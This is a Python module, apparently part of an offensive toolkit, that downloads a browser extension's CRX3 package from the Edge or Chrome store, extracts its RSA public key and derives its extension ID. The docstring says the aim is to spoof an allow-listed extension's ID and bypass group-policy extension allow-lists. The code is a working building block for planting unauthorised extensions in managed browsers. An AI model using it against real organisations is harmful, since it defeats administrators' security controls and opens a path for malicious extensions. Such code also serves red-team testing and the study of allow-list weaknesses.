"""
manifest.py: CRX3 public-key extraction and extension-ID derivation.

Ported from the stomp / GAP tools. Downloads a whitelisted extension's CRX3
from the browser store, extracts its RSA public key (SubjectPublicKeyInfo DER),
derives the extension ID, so a GPO allow-list ID can be spoofed.

Stdlib only (base64 / hashlib / struct / urllib / zipfile), no cryptography.
"""

import base64
import hashlib
import io
import json
import struct
import urllib.error
import urllib.request
import zipfile


EDGE_CRX_URL = (
    "https://edge.microsoft.com/extensionwebstorebase/v1/crx"
    "?response=redirect&prod=chromiumcrx&prodchannel="
    "&x=id%3D{ext_id}%26installsource%3Dondemand%26uc"
)

CHROME_CRX_URL = (
    "https://clients2.google.com/service/update2/crx"
    "?response=redirect&prodversion=120.0&acceptformat=crx3"
    "&x=id%3D{ext_id}%26uc"
)

BROWSER_TO_STORE = {
    "edge":    EDGE_CRX_URL,
    "chrome":  CHROME_CRX_URL,
    "brave":   CHROME_CRX_URL,
    "vivaldi": CHROME_CRX_URL,
}

RSA_OID = b"\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01"


def download_crx(ext_id: str, browser: str = "edge", proxy: str | None = None):
    """Download the CRX3 blob for an extension ID. Returns (bytes, url) or (None, None)."""
    url = BROWSER_TO_STORE[browser].format(ext_id=ext_id)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        if proxy:
            opener = urllib.request.build_opener(
                urllib.request.ProxyHandler({"http": proxy, "https": proxy})
            )
            with opener.open(req, timeout=15) as resp:
                return resp.read(), url
        with urllib.request.urlopen(req, timeout=15) as resp:
            return resp.read(), url
    except (urllib.error.HTTPError, urllib.error.URLError, OSError):
        return None, None


def _parse_spki_at(header: bytes, offset: int) -> bytes | None:
    """Try to parse a SubjectPublicKeyInfo SEQUENCE at header[offset]."""
    if offset < 0 or offset >= len(header) or header[offset] != 0x30:
        return None
    candidate = header[offset:]
    if len(candidate) < 2:
        return None
    b1 = candidate[1]
    if b1 == 0x82:
        if len(candidate) < 4:
            return None
        key_len = struct.unpack_from(">H", candidate, 2)[0] + 4
    elif b1 == 0x81:
        if len(candidate) < 3:
            return None
        key_len = candidate[2] + 3
    else:
        key_len = b1 + 2
    if key_len <= 0 or key_len > len(candidate):
        return None
    return candidate[:key_len]


def _collect_spki_candidates(header_data: bytes) -> list[bytes]:
    """
    Walk the CRX3 header and return every distinct RSA SPKI found.

    A CRX3 can carry multiple proofs (developer key + Google publisher key),
    so we collect them all and let the caller pick the right one.
    """
    candidates = []
    seen = set()
    search_from = 0

    while True:
        rel = header_data.find(RSA_OID, search_from)
        if rel == -1:
            break

        # Walk a small window backwards to find the enclosing SEQUENCE (0x30)
        start = max(0, rel - 6)
        for offset in range(start, rel):
            spki = _parse_spki_at(header_data, offset)
            if spki is None:
                continue
            # The SPKI must actually contain the OID we matched
            if RSA_OID not in spki:
                continue
            key = bytes(spki)
            if key not in seen:
                seen.add(key)
                candidates.append(key)
            break

        search_from = rel + len(RSA_OID)

    return candidates


def extract_key_from_zip(zip_data: bytes) -> bytes | None:
    try:
        with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
            if "manifest.json" in z.namelist():
                manifest = json.loads(z.read("manifest.json"))
                key_b64 = manifest.get("key")
                if key_b64:
                    return base64.b64decode(key_b64)
    except Exception:
        return None
    return None


def extract_public_key(crx_data: bytes, ext_id: str | None = None) -> bytes | None:
    """
    Extract the RSA public key (DER) from a CRX3 blob.

    When ext_id is provided, iterates over ALL RSA SPKIs found in the header
    and returns the one whose derived ID matches ext_id. This handles CRX3
    files that carry multiple proofs (developer key + Google publisher key).
    """
    if crx_data[:4] != b"Cr24":
        return None

    header_size = struct.unpack_from("<I", crx_data, 8)[0]
    header_data = crx_data[12: 12 + header_size]
    zip_data = crx_data[12 + header_size:]

    candidates = _collect_spki_candidates(header_data)

    if ext_id:
        # Try each candidate and return the one matching the requested ID
        for key_bytes in candidates:
            if key_to_crx_id(key_bytes) == ext_id:
                return key_bytes

        # Fallback: key may only be in the ZIP manifest
        zip_key = extract_key_from_zip(zip_data)
        if zip_key and key_to_crx_id(zip_key) == ext_id:
            return zip_key

        return None

    # No ext_id: return first candidate (legacy behaviour)
    if candidates:
        return candidates[0]
    return extract_key_from_zip(zip_data)


def key_to_crx_id(key_bytes: bytes) -> str:
    digest = hashlib.sha256(key_bytes).hexdigest()[:32]
    return ''.join(chr(ord('a') + int(c, 16)) for c in digest)


def get_public_key_for_id(ext_id: str, browser: str = "edge", proxy: str | None = None) -> str | None:
    """Fetch the whitelisted extension's public key (base64) for an ID, or None."""
    crx_data, _ = download_crx(ext_id, browser, proxy=proxy)
    if not crx_data:
        return None

    key_bytes = extract_public_key(crx_data, ext_id=ext_id)
    if not key_bytes:
        return None

    key_b64 = base64.b64encode(key_bytes).decode()

    if key_to_crx_id(key_bytes) != ext_id:
        return None

    return key_b64
